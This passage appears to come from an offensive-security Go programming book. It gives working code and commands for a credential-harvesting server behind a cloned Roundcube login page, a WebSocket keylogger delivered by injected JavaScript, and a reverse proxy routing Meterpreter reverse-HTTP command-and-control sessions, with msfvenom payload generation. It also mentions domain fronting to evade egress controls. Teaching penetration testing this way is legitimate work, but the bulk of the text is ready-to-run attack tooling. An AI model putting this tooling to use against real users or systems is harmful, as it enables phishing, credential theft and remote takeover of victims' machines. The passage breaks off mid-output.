<p class="indent">Running this produces HTML, and you should notice that the script tags and other nefarious characters that were provided as part of your context are properly encoded. Neat-o!</p>&#13;
<pre>$ <span class="codestrong1">go build -o template_example</span>&#13;
$ <span class="codestrong1">./template_example</span>&#13;
&#13;
&lt;html&gt;&#13;
  &lt;body&gt;&#13;
    Hello <span class="codeitalic1">&amp;lt;script&amp;gt;alert(&amp;#39;world&amp;#39;)&amp;lt;/script&amp;gt;</span>&#13;
<span epub:type="pagebreak" id="page_90"/>  &lt;/body&gt;&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent">We could say a lot more about templates. You can use logical operators with them; you can use them with loops and other control structures. You can call built-in functions, and you can even define and expose arbitrary helper functions to greatly expand the templating capabilities. Double neat-o! We recommend you dive in and research these possibilities. They’re beyond the scope of this book, but are powerful.</p>&#13;
<p class="indent">How about you step away from the basics of creating servers and handling requests and instead focus on something more nefarious. Let’s create a credential harvester!</p>&#13;
<h3 class="h3" id="ch4lev1sec2">Credential Harvesting</h3>&#13;
<p class="noindent">One of the staples of social engineering is the <em>credential-harvesting attack</em>. This type of attack captures users’ login information to specific websites by getting them to enter their credentials in a cloned version of the original site. The attack is useful against organizations that expose a single-factor authentication interface to the internet. Once you have a user’s credentials, you can use them to access their account on the actual site. This often leads to an initial breach of the organization’s perimeter network.</p>&#13;
<p class="indent">Go provides a great platform for this type of attack, because it’s quick to stand up new servers, and because it makes it easy to configure routing and to parse user-supplied input. You could add many customizations and features to a credential-harvesting server, but for this example, let’s stick to the basics.</p>&#13;
<p class="indent">To begin, you need to clone a site that has a login form. There are a lot of possibilities here. In practice, you’d probably want to clone a site in use by the target. For this example, though, you’ll clone a Roundcube site. <em>Roundcube</em> is an open source webmail client that’s not used as often as commercial software, such as Microsoft Exchange, but will allow us to illustrate the concepts just as well. You’ll use Docker to run Roundcube, because it makes the process easier.</p>&#13;
<p class="indent">You can start a Roundcube server of your own by executing the following. If you don’t want to run a Roundcube server, then no worries; the exercise source code has a clone of the site. Still, we’re including this for completeness:</p>&#13;
<pre>$ <span class="codestrong1">docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube</span></pre>&#13;
<p class="indent">The command starts a Roundcube Docker instance. If you navigate to <em>http://127.0.0.1:80</em>, you’ll be presented with a login form. Normally, you’d use <span class="literal">wget</span> to clone a site and all its requisite files, but Roundcube has JavaScript awesomeness that prevents this from working. Instead, you’ll use Google Chrome to save it. In the exercise folder, you should see a directory structure that looks like <a href="ch04.xhtml#ch4list7">Listing 4-7</a>.</p>&#13;
<pre><span epub:type="pagebreak" id="page_91"/>$ <span class="codestrong1">tree</span>&#13;
.&#13;
+-- main.go&#13;
+-- public&#13;
   +-- index.html&#13;
   +-- index_files&#13;
       +-- app.js&#13;
       +-- common.js&#13;
       +-- jquery-ui-1.10.4.custom.css&#13;
       +-- jquery-ui-1.10.4.custom.min.js&#13;
       +-- jquery.min.js&#13;
       +-- jstz.min.js&#13;
       +-- roundcube_logo.png&#13;
       +-- styles.css&#13;
       +-- ui.js&#13;
    index.html</pre>&#13;
<p class="caption" id="ch4list7"><em>Listing 4-7: Directory listing for</em> <a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/credential_harvester/">/ch-4/credential_harvester/</a></p>&#13;
<p class="indent">The files in the <em>public</em> directory represent the unaltered cloned login site. You’ll need to modify the original login form to redirect the entered credentials, sending them to yourself instead of the legitimate server. To begin, open <em>public/index.html</em> and find the form element used to POST the login request. It should look something like the following:</p>&#13;
<pre>&lt;form name="form" method="post" action="http://127.0.0.1/?_task=login"&gt;</pre>&#13;
<p class="indent">You need to modify the <span class="literal">action</span> attribute of this tag and point it to your server. Change <span class="literal">action</span> to <span class="literal">/login</span>. Don’t forget to save it. The line should now look like the following:</p>&#13;
<pre>&lt;form name="form" method="post" action="/login"&gt;</pre>&#13;
<p class="indent">To render the login form correctly and capture a username and password, you’ll first need to serve the files in the <em>public</em> directory. Then you’ll need to write a <span class="literal">HandleFunc</span> for <span class="literal">/login</span> to capture the username and password. You’ll also want to store the captured credentials in a file with some verbose logging.</p>&#13;
<p class="indent">You can handle all of this in just a few dozen lines of code. <a href="ch04.xhtml#ch4list8">Listing 4-8</a> shows the program in its entirety.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "net/http"&#13;
    "os"&#13;
    "time"&#13;
&#13;
    log "github.com/Sirupsen/logrus" <span class="ent">❶</span>&#13;
    "github.com/gorilla/mux"&#13;
)&#13;
&#13;
<span epub:type="pagebreak" id="page_92"/>func login(w http.ResponseWriter, r *http.Request) {&#13;
    log.WithFields(log.Fields{ <span class="ent">❷</span>&#13;
        "time":       time.Now().String(),&#13;
        "username":   r.FormValue("_user"), <span class="ent">❸</span>&#13;
        "password":   r.FormValue("_pass"), <span class="ent">❹</span>&#13;
        "user-agent": r.UserAgent(),&#13;
        "ip_address": r.RemoteAddr,&#13;
    }).Info("login attempt")&#13;
    http.Redirect(w, r, "/", 302)&#13;
}&#13;
&#13;
func main() {&#13;
    fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) <span class="ent">❺</span>&#13;
    if err != nil {&#13;
        panic(err)&#13;
    }&#13;
    defer fh.Close()&#13;
    log.SetOutput(fh) <span class="ent">❻</span>&#13;
    r := mux.NewRouter()&#13;
    r.HandleFunc("/login", login).Methods("POST") <span class="ent">❼</span>&#13;
    r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) <span class="ent">❽</span>&#13;
    log.Fatal(http.ListenAndServe(":8080", r))&#13;
}</pre>&#13;
<p class="caption" id="ch4list8"><em>Listing 4-8: Credential-harvesting server (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/credential_harvester/main.go">/ch-4/credential_harvester/main.go</a><em>)</em></p>&#13;
<p class="indent">The first thing worth noting is you import <span class="literal">github.com/Sirupsen/logrus</span> <span class="ent">❶</span>. This is a structured logging package that we prefer to use instead of the standard Go <span class="literal">log</span> package. It provides more configurable logging options for better error handling. To use this package, you’ll need to make sure you ran <span class="literal">go get</span> beforehand.</p>&#13;
<p class="indent">Next, you define the <span class="literal">login()</span> handler function. Hopefully, this pattern looks familiar. Inside this function, you use <span class="literal">log.WithFields()</span> to write out your captured data <span class="ent">❷</span>. You display the current time, the user-agent, and IP address of the requester. You also call <span class="literal">FormValue(</span><span class="codeitalic">string</span><span class="literal">)</span> to capture both the username (<span class="literal">_user</span>) <span class="ent">❸</span> and password (<span class="literal">_pass</span>) <span class="ent">❹</span> values that were submitted. You get these values from <em>index.html</em> and by locating the form input elements for each username and password. Your server needs to explicitly align with the names of the fields as they exist in the login form.</p>&#13;
<p class="indent">The following snippet, extracted from <em>index.html</em>, shows the relevant input items, with the element names in bold for clarity:</p>&#13;
<pre>&lt;td class="input"&gt;&lt;input name="<span class="codestrong1">_user</span>" id="rcmloginuser" required="required"<br/>size="40" autocapitalize="off" autocomplete="off" type="text"&gt;&lt;/td&gt;&#13;
&lt;td class="input"&gt;&lt;input name="<span class="codestrong1">_pass</span>" id="rcmloginpwd" required="required"<br/>size="40" autocapitalize="off" autocomplete="off" type="password"&gt;&lt;/td&gt;</pre>&#13;
<p class="indent">In your <span class="literal">main()</span> function, you begin by opening a file that’ll be used to store your captured data <span class="ent">❺</span>. Then, you use <span class="literal">log.SetOutput(</span><span class="codeitalic">io.Writer</span><span class="literal">)</span>, passing it the file handle you just created, to configure the logging package so that <span epub:type="pagebreak" id="page_93"/>it’ll write its output to that file <span class="ent">❻</span>. Next, you create a new router and mount the <span class="literal">login()</span> handler function <span class="ent">❼</span>.</p>&#13;
<p class="indent">Prior to starting the server, you do one more thing that may look unfamiliar: you tell your router to serve static files from a directory <span class="ent">❽</span>. That way, your Go server explicitly knows where your static files—images, JavaScript, HTML—live. Go makes this easy, and provides protections against directory traversal attacks. Starting from the inside out, you use <span class="literal">http.Dir(</span><span class="codeitalic">string</span><span class="literal">)</span> to define the directory from which you wish to serve the files. The result of this is passed as input to <span class="literal">http.FileServer(</span><span class="codeitalic">FileSystem</span><span class="literal">)</span>, which creates an <span class="literal">http.Handler</span> for your directory. You’ll mount this to your router by using <span class="literal">PathPrefix(</span><span class="codeitalic">string</span><span class="literal">)</span>. Using <span class="literal">/</span> as a path prefix will match any request that hasn’t already found a match. Note that, by default, the handler returned from <span class="literal">FileServer</span> does support directory indexing. This could leak some information. It’s possible to disable this, but we won’t cover that here.</p>&#13;
<p class="indent">Finally, as you have before, you start the server. Once you’ve built and executed the code in <a href="ch04.xhtml#ch4list8">Listing 4-8</a>, open your web browser and navigate to <em>http://localhost:8080</em>. Try submitting a username and password to the form. Then head back to the terminal, exit the program, and view the <em>credentials.txt</em> file, shown here:</p>&#13;
<pre>$ <span class="codestrong1">go build -o credential_harvester</span>&#13;
$ <span class="codestrong1">./credential_harvester</span>&#13;
^C&#13;
$ <span class="codestrong1">cat credentials.txt</span>&#13;
INFO[0038] login attempt&#13;
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13<br/>21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64;<br/>rv:51.0) Gecko/20100101 Firefox/51.0" username=bob</pre>&#13;
<p class="indent">Look at those logs! You can see that you submitted the username of <span class="literal">bob</span> and the password of <span class="literal">p@ssw0rd1!</span>. Your malicious server successfully handled the form POST request, captured the entered credentials, and saved them to a file for offline viewing. As an attacker, you could then attempt to use these credentials against the target organization and proceed with further compromise.</p>&#13;
<p class="indent">In the next section, you’ll work through a variation of this credential-harvesting technique. Instead of waiting for form submission, you’ll create a keylogger to capture keystrokes in real time.</p>&#13;
<h3 class="h3" id="ch4lev1sec3">Keylogging with the WebSocket API</h3>&#13;
<p class="noindent">The <em>WebSocket API (WebSockets)</em>, a full duplex protocol, has increased in popularity over the years and many browsers now support it. It provides a way for web application servers and clients to efficiently communicate with each other. Most importantly, it allows the server to send messages to a client without the need for polling.</p>&#13;
<p class="indent">WebSockets are useful for building “real-time” applications, such as chat and games, but you can use them for nefarious purposes as well, <span epub:type="pagebreak" id="page_94"/>such as injecting a keylogger into an application to capture every key a user presses. To begin, imagine you’ve identified an application that is vulnerable to <em>cross-site scripting</em> (a flaw through which a third party can run arbitrary JavaScript in a victim’s browser) or you’ve compromised a web server, allowing you to modify the application source code. Either scenario should let you include a remote JavaScript file. You’ll build the server infrastructure to handle a WebSocket connection from a client and handle incoming keystrokes.</p>&#13;
<p class="indent">For demonstration purposes, you’ll use JS Bin (<em><a href="http://jsbin.com">http://jsbin.com</a></em>) to test your payload. JS Bin is an online playground where developers can test their HTML and JavaScript code. Navigate to JS Bin in your web browser and paste the following HTML into the column on the left, completely replacing the default code:</p>&#13;
<pre>&lt;!DOCTYPE html&gt;&#13;
&lt;html&gt;&#13;
&lt;head&gt;&#13;
  &lt;title&gt;Login&lt;/title&gt;&#13;
&lt;/head&gt;&#13;
&lt;body&gt;&#13;
 &lt;script src='http://localhost:8080/k.js'&gt;&lt;/script&gt;&#13;
  &lt;form action='/login' method='post'&gt;&#13;
    &lt;input name='username'/&gt;&#13;
    &lt;input name='password'/&gt;&#13;
    &lt;input type="submit"/&gt;   &#13;
  &lt;/form&gt;&#13;
&lt;/body&gt;&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent">On the right side of the screen, you’ll see the rendered form. As you may have noticed, you’ve included a <span class="literal">script</span> tag with the <span class="literal">src</span> attribute set to <span class="literal">http://localhost:8080/k.js</span>. This is going to be the JavaScript code that will create the WebSocket connection and send user input to the server.</p>&#13;
<p class="indent">Your server is going to need to do two things: handle the WebSocket and serve the JavaScript file. First, let’s get the JavaScript out of the way, since after all, this book is about Go, not JavaScript. (Check out <em><a href="https://github.com/gopherjs/gopherjs/">https://github.com/gopherjs/gopherjs/</a></em> for instructions on writing JavaScript with Go.) The JavaScript code is shown here:</p>&#13;
<pre>(function() {&#13;
    var conn = new WebSocket("ws://{{.}}/ws");&#13;
    document.onkeypress = keypress;&#13;
    function keypress(evt) {&#13;
        s = String.fromCharCode(evt.which);&#13;
        conn.send(s);&#13;
    }&#13;
})();</pre>&#13;
<p class="indent">The JavaScript code handles keypress events. Each time a key is pressed, the code sends the keystrokes over a WebSocket to a resource at <span class="literal">ws://{{.}}/ws</span>. Recall that the <span class="literal">{{.}}</span> value is a Go template placeholder representing the <span epub:type="pagebreak" id="page_95"/>current context. This resource represents a WebSocket URL that will populate the server location information based on a string you’ll pass to the template. We’ll get to that in a minute. For this example, you’ll save the JavaScript in a file named <em>logger.js</em>.</p>&#13;
<p class="indent">But wait, you say, we said we were serving it as <em>k.js</em>! The HTML we showed previously also explicitly uses <em>k.js</em>. What gives? Well, <em>logger.js</em> is a Go template, not an actual JavaScript file. You’ll use <em>k.js</em> as your pattern to match against in your router. When it matches, your server will render the template stored in the <em>logger.js</em> file, complete with contextual data that represents the host to which your WebSocket connects. You can see how this works by looking at the server code, shown in <a href="ch04.xhtml#ch4list9">Listing 4-9</a>.</p>&#13;
<pre>import (&#13;
    "flag"&#13;
    "fmt"&#13;
    "html/template"&#13;
    "log"&#13;
    "net/http"&#13;
&#13;
    "github.com/gorilla/mux"&#13;
 <span class="ent">❶</span> "github.com/gorilla/websocket"&#13;
)&#13;
&#13;
var (&#13;
 <span class="ent">❷</span> upgrader = websocket.Upgrader{&#13;
        CheckOrigin: func(r *http.Request) bool { return true },&#13;
    }&#13;
&#13;
    listenAddr string&#13;
    wsAddr     string&#13;
    jsTemplate *template.Template&#13;
)&#13;
&#13;
func init() {&#13;
    flag.StringVar(&amp;listenAddr, "listen-addr", "", "Address to listen on")&#13;
    flag.StringVar(&amp;wsAddr, "ws-addr", "", "Address for WebSocket connection")&#13;
    flag.Parse()&#13;
    var err error&#13;
 <span class="ent">❸</span> jsTemplate, err = template.ParseFiles("logger.js")&#13;
    if err != nil {&#13;
        panic(err)&#13;
    }&#13;
}&#13;
&#13;
func serveWS(w http.ResponseWriter, r *http.Request) {&#13;
 <span class="ent">❹</span> conn, err := upgrader.Upgrade(w, r, nil)&#13;
    if err != nil {&#13;
        http.Error(w, "", 500)&#13;
        return&#13;
    }&#13;
    defer conn.Close()&#13;
    fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())&#13;
<span epub:type="pagebreak" id="page_96"/>    for {&#13;
     <span class="ent">❺</span> _, msg, err := conn.ReadMessage()&#13;
        if err != nil {&#13;
            return&#13;
        }&#13;
     <span class="ent">❻</span> fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))&#13;
    }&#13;
}&#13;
&#13;
func serveFile(w http.ResponseWriter, r *http.Request) {&#13;
 <span class="ent">❼</span> w.Header().Set("Content-Type", "application/javascript")&#13;
 <span class="ent">❽</span> jsTemplate.Execute(w, wsAddr)&#13;
}&#13;
&#13;
func main() {&#13;
    r := mux.NewRouter()&#13;
 <span class="ent">❾</span> r.HandleFunc("/ws", serveWS)&#13;
 <span class="ent">❿</span> r.HandleFunc("/k.js", serveFile)&#13;
    log.Fatal(http.ListenAndServe(":8080", r))&#13;
}</pre>&#13;
<p class="caption" id="ch4list9"><em>Listing 4-9: Keylogging server (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/websocket_keylogger/main.go">/ch-4/websocket_keylogger/main.go</a><em>)</em></p>&#13;
<p class="indent">We have a lot to cover here. First, note that you’re using another third-party package, <span class="literal">gorilla/websocket</span>, to handle your WebSocket communications <span class="ent">❶</span>. This is a full-featured, powerful package that simplifies your development process, like the <span class="literal">gorilla/mux</span> router you used earlier in this chapter. Don’t forget to run <span class="codestrong">go get github.com/gorilla/websocket</span> from your terminal first.</p>&#13;
<p class="indent">You then define several variables. You create a <span class="literal">websocket.Upgrader</span> instance that’ll essentially whitelist every origin <span class="ent">❷</span>. It’s typically bad security practice to allow all origins, but in this case, we’ll roll with it since this is a test instance we’ll run on our local workstations. For use in an actual malicious deployment, you’d likely want to limit the origin to an explicit value.</p>&#13;
<p class="indent">Within your <span class="literal">init()</span> function, which executes automatically before <span class="literal">main()</span>, you define your command line arguments and attempt to parse your Go template stored in the <em>logger.js</em> file. Notice that you’re calling <span class="literal">template.ParseFiles("logger.js")</span> <span class="ent">❸</span>. You check the response to make sure the file parsed correctly. If all is successful, you have your parsed template stored in a variable named <span class="literal">jsTemplate</span>.</p>&#13;
<p class="indent">At this point, you haven’t provided any contextual data to your template or executed it. That’ll happen shortly. First, however, you define a function named <span class="literal">serveWS()</span> that you’ll use to handle your WebSocket communications. You create a new <span class="literal">websocket.Conn</span> instance by calling <span class="literal">upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)</span> <span class="ent">❹</span>. The <span class="literal">Upgrade()</span> method upgrades the HTTP connection to use the WebSocket protocol. That means that any request handled by this function will be upgraded to use WebSockets. You interact with the connection within an infinite <span class="literal">for</span> loop, calling <span class="literal">conn.ReadMessage()</span> to read incoming messages <span class="ent">❺</span>. If your JavaScript works appropriately, these messages should consist of captured keystrokes. You write these messages and the client’s remote IP address to stdout <span class="ent">❻</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_97"/>You’ve tackled arguably the hardest piece of the puzzle in creating your WebSocket handler. Next, you create another handler function named <span class="literal">serveFile()</span>. This function will retrieve and return the contents of your JavaScript template, complete with contextual data included. To do this, you set the <span class="literal">Content-Type</span> header as <span class="literal">application/javascript</span> <span class="ent">❼</span>. This will tell connecting browsers that the contents of the HTTP response body should be treated as JavaScript. In the second and last line of the handler function, you call <span class="literal">jsTemplate.Execute(w, wsAddr)</span> <span class="ent">❽</span>. Remember how you parsed <em>logger.js</em> while you were bootstrapping your server in the <span class="literal">init()</span> function? You stored the result within the variable named <span class="literal">jsTemplate</span>. This line of code processes that template. You pass to it an <span class="literal">io.Writer</span> (in this case, you’re using <span class="literal">w</span>, an <span class="literal">http.ResponseWriter</span>) and your contextual data of type <span class="literal">interface{}</span>. The <span class="literal">interface{}</span> type means that you can pass any type of variable, whether they’re strings, structs, or something else. In this case, you’re passing a string variable named <span class="literal">wsAddr</span>. If you jump back up to the <span class="literal">init()</span> function, you’ll see that this variable contains the address of your WebSocket server and is set via a command line argument. In short, it populates the template with data and writes it as an HTTP response. Pretty slick!</p>&#13;
<p class="indent">You’ve implemented your handler functions, <span class="literal">serveFile()</span> and <span class="literal">serveWS()</span>. Now, you just need to configure your router to perform pattern matching so that you can pass execution to the appropriate handler. You do this, much as you have previously, in your <span class="literal">main()</span> function. The first of your two handler functions matches the <span class="literal">/ws</span> URL pattern, executing your <span class="literal">serveWS()</span> function to upgrade and handle WebSocket connections <span class="ent">❾</span>. The second route matches the pattern <span class="literal">/k.js</span>, executing the <span class="literal">serveFile()</span> function as a result <span class="ent">❿</span>. This is how your server pushes a rendered JavaScript template to the client.</p>&#13;
<p class="indent">Let’s fire up the server. If you open the HTML file, you should see a message that reads <span class="literal">connection established</span>. This is logged because your JavaScript file has been rendered in the browser and requested a WebSocket connection. If you enter credentials into the form elements, you should see them printed to stdout on the server:</p>&#13;
<pre>$ <span class="codestrong1">go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080</span>&#13;
Connection from 127.0.0.1:58438&#13;
From 127.0.0.1:58438: u&#13;
From 127.0.0.1:58438: s&#13;
From 127.0.0.1:58438: e&#13;
From 127.0.0.1:58438: r&#13;
From 127.0.0.1:58438:&#13;
From 127.0.0.1:58438: p&#13;
From 127.0.0.1:58438: @&#13;
From 127.0.0.1:58438: s&#13;
From 127.0.0.1:58438: s&#13;
From 127.0.0.1:58438: w&#13;
From 127.0.0.1:58438: o&#13;
From 127.0.0.1:58438: r&#13;
From 127.0.0.1:58438: d</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_98"/>You did it! It works! Your output lists each individual keystroke that was pressed when filling out the login form. In this case, it’s a set of user credentials. If you’re having issues, make sure you’re supplying accurate addresses as command line arguments. Also, the HTML file itself may need tweaking if you’re attempting to call <em>k.js</em> from a server other than <span class="literal">localhost:8080</span>.</p>&#13;
<p class="indent">You could improve this code in several ways. For one, you might want to log the output to a file or other persistent storage, rather than to your terminal. This would make you less likely to lose your data if the terminal window closes or the server reboots. Also, if your keylogger logs the keystrokes of multiple clients simultaneously, the output will mix the data, making it potentially difficult to piece together a specific user’s credentials. You could avoid this by finding a better presentation format that, for example, groups keystrokes by unique client/port source.</p>&#13;
<p class="indent">Your journey through credential harvesting is complete. We’ll end this chapter by presenting multiplexing HTTP command-and-control connections.</p>&#13;
<h3 class="h3" id="ch4lev1sec4">Multiplexing Command-and-Control</h3>&#13;
<p class="noindent">You’ve arrived at the last section of the chapter on HTTP servers. Here, you’ll look at how to multiplex Meterpreter HTTP connections to different backend control servers. <em>Meterpreter</em> is a popular, flexible command-and-control (C2) suite within the Metasploit exploitation framework. We won’t go into too many details about Metasploit or Meterpreter. If you’re new to it, we recommend reading through one of the many tutorial or documentation sites.</p>&#13;
<p class="indent">In this section, we’ll walk through creating a reverse HTTP proxy in Go so that you can dynamically route your incoming Meterpreter sessions based on the <span class="literal">Host</span> HTTP header, which is how virtual website hosting works. However, instead of serving different local files and directories, you’ll proxy the connection to different Meterpreter listeners. This is an interesting use case for a few reasons.</p>&#13;
<p class="indent">First, your proxy acts as a redirector, allowing you to expose only that domain name and IP address without exposing your Metasploit listeners. If the redirector ever gets blacklisted, you can simply move it without having to move your C2 server. Second, you can extend the concepts here to perform <em>domain fronting</em>, a technique for leveraging trusted third-party domains (often from cloud providers) to bypass restrictive egress controls. We won’t go into a full-fledged example here, but we highly recommend you dig into it, as it can be pretty powerful, allowing you to egress restricted networks. Lastly, the use case demonstrates how you can share a single host/port combination among a team of allies potentially attacking different target organizations. Since ports 80 and 443 are the most likely allowed egress ports, you can use your proxy to listen on those ports and intelligently route the connections to the correct listener.</p>&#13;
<p class="indent">Here’s the plan. You’ll set up two separate Meterpreter reverse HTTP listeners. In this example, these will reside on a virtual machine with an IP <span epub:type="pagebreak" id="page_99"/>address of 10.0.1.20, but they could very well exist on separate hosts. You’ll bind your listeners to ports 10080 and 20080, respectively. In a real situation, these listeners can be running anywhere so long as the proxy can reach those ports. Make sure you have Metasploit installed (it comes pre-installed on Kali Linux); then start your listeners.</p>&#13;
<pre>   $ <span class="codestrong1">msfconsole</span>&#13;
   &gt; <span class="codestrong1">use exploit/multi/handler</span>&#13;
   &gt; <span class="codestrong1">set payload windows/meterpreter_reverse_http</span>&#13;
<span class="ent">❶</span> &gt; <span class="codestrong1">set LHOST 10.0.1.20</span>&#13;
   &gt; <span class="codestrong1">set LPORT 80</span>&#13;
<span class="ent">❷</span> &gt; <span class="codestrong1">set ReverseListenerBindAddress 10.0.1.20</span>&#13;
   &gt; <span class="codestrong1">set ReverseListenerBindPort 10080</span>&#13;
   &gt; <span class="codestrong1">exploit -j -z</span>&#13;
   [*] Exploit running as background job 1.&#13;
&#13;
   [*] Started HTTP reverse handler on http://10.0.1.20:10080</pre>&#13;
<p class="indent">When you start your listener, you supply the proxy data as the <span class="literal">LHOST</span> and <span class="literal">LPORT</span> values <span class="ent">❶</span>. However, you set the advanced options <span class="literal">ReverseListenerBindAddress</span> and <span class="literal">ReverseListenerBindPort</span> to the actual IP and port on which you want the listener to start <span class="ent">❷</span>. This gives you some flexibility in port usage while allowing you to explicitly identify the proxy host—which may be a hostname, for example, if you were setting up domain fronting.</p>&#13;
<p class="indent">On a second instance of Metasploit, you’ll do something similar to start an additional listener on port 20080. The only real difference here is that you’re binding to a different port:</p>&#13;
<pre>$ <span class="codestrong1">msfconsole</span>&#13;
&gt; <span class="codestrong1">use exploit/multi/handler</span>&#13;
&gt; <span class="codestrong1">set payload windows/meterpreter_reverse_http</span>&#13;
&gt; <span class="codestrong1">set LHOST 10.0.1.20</span>&#13;
&gt; <span class="codestrong1">set LPORT 80</span>&#13;
&gt; <span class="codestrong1">set ReverseListenerBindAddress 10.0.1.20</span>&#13;
&gt; <span class="codestrong1">set ReverseListenerBindPort 20080</span>&#13;
&gt; <span class="codestrong1">exploit -j -z</span>&#13;
[*] Exploit running as background job 1.&#13;
&#13;
[*] Started HTTP reverse handler on http://10.0.1.20:20080</pre>&#13;
<p class="indent">Now, let’s create your reverse proxy. <a href="ch04.xhtml#ch4list10">Listing 4-10</a> shows the code in its entirety.</p>&#13;
<pre>   package main&#13;
&#13;
   import (&#13;
       "log"&#13;
       "net/http"&#13;
    <span class="ent">❶</span> "net/http/httputil"&#13;
       "net/url"&#13;
<span epub:type="pagebreak" id="page_100"/>       "github.com/gorilla/mux"&#13;
   )&#13;
&#13;
<span class="ent">❷</span> var (&#13;
       hostProxy = make(map[string]string)&#13;
       proxies   = make(map[string]*httputil.ReverseProxy)&#13;
   )&#13;
&#13;
   func init() {&#13;
    <span class="ent">❸</span> hostProxy["attacker1.com"] = "http://10.0.1.20:10080"&#13;
       hostProxy["attacker2.com"] = "http://10.0.1.20:20080"&#13;
&#13;
       for k, v := range hostProxy {&#13;
        <span class="ent">❹</span> remote, err := url.Parse(v)&#13;
           if err != nil {&#13;
               log.Fatal("Unable to parse proxy target")&#13;
           }  &#13;
        <span class="ent">❺</span> proxies[k] = httputil.NewSingleHostReverseProxy(remote)&#13;
       }  &#13;
   }&#13;
&#13;
   func main() {&#13;
       r := mux.NewRouter()&#13;
       for host, proxy := range proxies {&#13;
        <span class="ent">❻</span> r.Host(host).Handler(proxy)&#13;
       }  &#13;
       log.Fatal(http.ListenAndServe(":80", r))&#13;
   }</pre>&#13;
<p class="caption" id="ch4list10"><em>Listing 4-10: Multiplexing Meterpreter (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-4/multiplexer/main.go">/ch-4/multiplexer/main.go</a><em>)</em></p>&#13;
<p class="indent">First off, you’ll notice that you’re importing the <span class="literal">net/http/httputil</span> package <span class="ent">❶</span>, which contains functionality to assist with creating a reverse proxy. It’ll save you from having to create one from scratch.</p>&#13;
<p class="indent">After you import your packages, you define a pair of variables <span class="ent">❷</span>. Both variables are maps. You’ll use the first, <span class="literal">hostProxy</span>, to map hostnames to the URL of the Metasploit listener to which you’ll want that hostname to route. Remember, you’ll be routing based on the <span class="literal">Host</span> header that your proxy receives in the HTTP request. Maintaining this mapping is a simple way to determine destinations.</p>&#13;
<p class="indent">The second variable you define, <span class="literal">proxies</span>, will also use hostnames as its key values. However, their corresponding values in the map are <span class="literal">*httputil.ReverseProxy</span> instances. That is, the values will be actual proxy instances to which you can route, rather than string representations of the destination.</p>&#13;
<p class="indent">Notice that you’re hardcoding this information, which isn’t the most elegant way to manage your configuration and proxy data. A better implementation would store this information in an external configuration file instead. We’ll leave that as an exercise for you.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_101"/>You use an <span class="literal">init()</span> function to define the mappings between domain names and destination Metasploit instances <span class="ent">❸</span>. In this case, you’ll route any request with a <span class="literal">Host</span> header value of <span class="literal">attacker1.com</span> to <span class="literal">http://10.0.1.20:10080</span> and anything with a <span class="literal">Host</span> header value of <span class="literal">attacker2.com</span> to <span class="literal">http://10.0.1.20:20080</span>. Of course, you aren’t actually doing the routing yet; you’re just creating your rudimentary configuration. Notice that the destinations correspond to the <span class="literal">ReverseListenerBindAddress</span> and <span class="literal">ReverseListenerBindPort</span> values you used for your Meterpreter listeners earlier.</p>&#13;
<p class="indent">Next, still within your <span class="literal">init()</span> function, you loop over your <span class="literal">hostProxy</span> map, parsing the destination addresses to create <span class="literal">net.URL</span> instances <span class="ent">❹</span>. You use the result of this as input into a call to <span class="literal">httputil.NewSingleHostReverseProxy(net.URL)</span> <span class="ent">❺</span>, which is a helper function that creates a reverse proxy from a URL. Even better, the <span class="literal">httputil.ReverseProxy</span> type satisfies the <span class="literal">http.Handler</span> interface, which means you can use the created proxy instances as handlers for your router. You do this within your <span class="literal">main()</span> function. You create a router and then loop over all of your proxy instances. Recall that the key is the hostname, and the value is of type <span class="literal">httputil.ReverseProxy</span>. For each key/value pair in your map, you add a matching function onto your router <span class="ent">❻</span>. The Gorilla MUX toolkit’s <span class="literal">Route</span> type contains a matching function named <span class="literal">Host</span> that accepts a hostname to match <span class="literal">Host</span> header values in incoming requests against. For each hostname you want to inspect, you tell the router to use the corresponding proxy. It’s a surprisingly easy solution to what could otherwise be a complicated problem.</p>&#13;
<p class="indent">Your program finishes by starting the server, binding it to port 80. Save and run the program. You’ll need to do so as a privileged user since you’re binding to a privileged port.</p>&#13;
<p class="indent">At this point, you have two Meterpreter reverse HTTP listeners running, and you should have a reverse proxy running now as well. The last step is to generate test payloads to check that your proxy works. Let’s use <span class="literal">msfvenom</span>, a payload generation tool that ships with Metasploit, to generate a pair of Windows executable files:</p>&#13;
<pre>$ <span class="codestrong1">msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80&#13;
HttpHostHeader=attacker1.com -f exe -o payload1.exe</span>&#13;
$ <span class="codestrong1">msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80&#13;
HttpHostHeader=attacker2.com -f exe -o payload2.exe</span></pre>&#13;
<p class="indent">This generates two output files named <em>payload1.exe</em> and <em>payload2.exe</em>. Notice that the only difference between the two, besides the output filename, is the <span class="literal">HttpHostHeader</span> values. This ensures that the resulting payload sends its HTTP requests with a specific <span class="literal">Host</span> header value. Also of note is that the <span class="literal">LHOST</span> and <span class="literal">LPORT</span> values correspond to your reverse proxy information and not your Meterpreter listeners. Transfer the resulting executables to a Windows system or virtual machine. When you execute the files, you should see two new <span epub:type="pagebreak" id="page_102"/>sessions established: one on the listener bound to port 10080, and one on the listener bound to port 20080. They should look something like this:</p>&#13;
<pre>&gt;&#13;
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless&#13;
